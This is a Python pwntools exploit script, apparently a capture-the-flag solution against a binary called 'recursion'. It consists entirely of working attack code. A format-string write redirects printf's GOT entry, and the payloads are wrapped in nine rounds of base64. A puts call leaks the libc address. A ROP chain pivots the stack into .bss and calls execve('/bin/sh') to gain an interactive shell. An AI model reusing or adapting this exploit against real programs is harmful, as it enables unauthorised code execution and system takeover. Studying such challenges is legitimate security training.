from pwn import *

# context.log_level = 'debug'
# context.aslr = False

# io = remote('172.16.1.3', 20003)
io = process('./recursion')
e = ELF('./recursion')
libc = e.libc
# libc = ELF('./libc.so.6')

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x00401866
	addr2 = 0x00401850
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)


#write_map = {value:arg_index, ...}
def gen_fmt_payload(write_map, printed):
	payload = ''
	for value in sorted(write_map):
		tmp = value-printed
		if tmp > 0:
			payload += '%'+ str(tmp) + 'c%'
		payload += str(write_map[value]) +'$hn'
		printed = value 
	return payload


#	.text:08048CB9                 call    _printf

# gdb.attach(io, 'b *0x08048C6D\nb*0x08048C4E\nb*0x08048CD5')

# gdb.attach(io, 'b *0x08048CB9')

bss_addr = 0x804B054
ret = 0x804847e
popret = 0x8048495
pop2ret = 0x8048b34
pop3ret = 0x8048d39
pop4ret = 0x8048d38
leaveret = 0x80489ca
addesp_12 = 0x8048492
addesp_16 = 0x8048605
addesp_72 = 0x8048b31

main = 0x8048B37 
leave_ret =0x8048AE3 #0x08048608 #: leave ; ret

buf = 'aaaa'+p32(0x8048e5f) +'B'*8 
buf += p32(bss_addr + 4) + p32(0xdeadbeef) + p32(0xdeadbeef) # ecx(esp+4), edi, ebp,
buf += p32(e.plt['puts']) + p32(main) + p32(e.got['read']) 

pre_len = len(buf)

# printf -> main
write_map= {0x8608:260, 0x0804:261}
buf += gen_fmt_payload(write_map, pre_len)
addr_buf = p32(e.got['printf']) + p32(e.got['printf']+2)

for i in range(9):
	buf = buf.encode('base64').replace('\n','')
	assert len(buf) % 4 == 0

buf += '\x00'
buf = buf.ljust(0x400, 'a')
buf += 'B'*8
buf += addr_buf 
# buf += 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA'

popebp = 0x08048afe #: pop ebp ; ret

answer('Recursion\n', buf)

buf = io.recv(4)
read_addr = u32(buf)

libc.address = read_addr - libc.symbols['read']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search('/bin/sh'))

log.success("read= %#x"%read_addr)

buf = 'aaaa'+p32(0x8048e5f) +'B'*8 
buf += p32(bss_addr + 4) + p32(0xdeadbeef) + p32(0xdeadbeef) # ecx(esp+4), edi, ebp,
# buf += p32(system_addr) + p32(main) + p32(bin_sh_addr)
buf += p32(libc.symbols['gets']) + p32(popebp) + p32(bss_addr)
buf += p32(leaveret)



for i in range(9):
	buf = buf.encode('base64').replace('\n','')
	assert len(buf) % 4 == 0
	# print buf

answer('Recursion\n', buf)


buf ='AAAA' + p32(libc.symbols['execve']) + p32(0xdeadbeef) + p32(bin_sh_addr) + p32(0) + p32(0)

io.sendline(buf)


io.interactive()

